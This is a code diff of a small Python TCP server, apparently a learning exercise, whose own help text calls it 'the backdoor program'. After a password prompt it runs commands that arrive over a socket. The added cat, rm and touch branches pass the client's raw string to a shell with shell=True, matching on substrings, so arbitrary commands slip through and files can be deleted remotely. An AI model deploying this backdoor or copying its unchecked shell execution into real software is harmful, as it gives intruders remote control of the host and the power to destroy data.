@@ -1,12 +1,15 @@
 #!/usr/bin/python
 
-import socketserver, subprocess
+import socketserver
+import subprocess
 
 PASSWORD_PROMPT = 'Password for user: '
 AUTHENTICATE_SUCCESS = 'Login success'
 AUTHENTICATE_FAIL = 'Login fail'
-INVALID_COMMAND = 'No command found: '
+INVALID_COMMAND = 'Command could not be executed: '
 PROMPT_COMMAND = 'indra@localhost > '
+OFF = 'Have a great day!'
+OK = 'OK'
 
 class TCPHandler(socketserver.BaseRequestHandler):
     BUFFER_SIZE = 4096
@@ -23,6 +26,9 @@ class TCPHandler(socketserver.BaseRequestHandler):
             print(output)
             if output == 'invalid':
                 self.send_nl(INVALID_COMMAND + command)
+            elif output == 'off':
+                self.send_nl(OFF)
+                break;
             else:
                 self.send_nl(output)
 
@@ -48,20 +54,47 @@ class TCPHandler(socketserver.BaseRequestHandler):
                 self.send_nl(AUTHENTICATE_FAIL)
 
     def execute_command(self, command):
-        if command == "ls":
-            # subprocess.call(["ls", "-l"])
-            output = subprocess.check_output(["ls", "-l"])
-        elif command == "pwd":
-            # subprocess.call(["ls", "-l"])
-            output = subprocess.check_output(["pwd"])
-        elif "cd" in command:
-            print(command)
-            subprocess.call("cd /", shell=True, cwd="/")
-            output = subprocess.check_output("cd /", shell=True, cwd="/")
-        else:
+        try:
+            if command == "help":
+                output = 'pwd        : returns working director\n' \
+                    'cd <dir>   : changes working directory to <dir>\n' \
+                    'ls         : lists the contents of working directory\n' \
+                    'cat <file> : returns contents of the file\n' \
+                    'help       : prints a list of commands\n' \
+                    'off        : terminates the backdoor program'
+            elif command == "ls":
+                # subprocess.call(["ls", "-l"])
+                output = subprocess.check_output(["ls", "-l"])
+            elif command == "pwd":
+                # subprocess.call(["ls", "-l"])
+                output = subprocess.check_output(["pwd"])
+            #TODO cd
+            elif "cd" in command:
+                print(command)
+                subprocess.call("cd /", shell=True, cwd="/")
+                output = OK
+                # output = subprocess.check_output("cd /", shell=True, cwd="/")
+            elif "cat" in command:
+                output = subprocess.check_output(command, shell=True)
+            elif "ps" in command:
+                output = subprocess.check_output('ps aux', shell=True)
+            elif "rm" in command:
+                subprocess.check_output(command, shell=True)
+                output = OK
+            elif "touch" in command:
+                subprocess.check_output(command, shell=True)
+                output = OK
+            elif "off" in command:
+                output = 'off'
+            else:
+                output = "invalid"
+        except subprocess.CalledProcessError:
             output = "invalid"
 
-        return output.decode('utf-8')
+        if isinstance(output, bytes):
+            return output.decode('utf-8')
+        else:
+            return output
 
 if __name__ == "__main__":
     HOST, PORT = "localhost", 9999
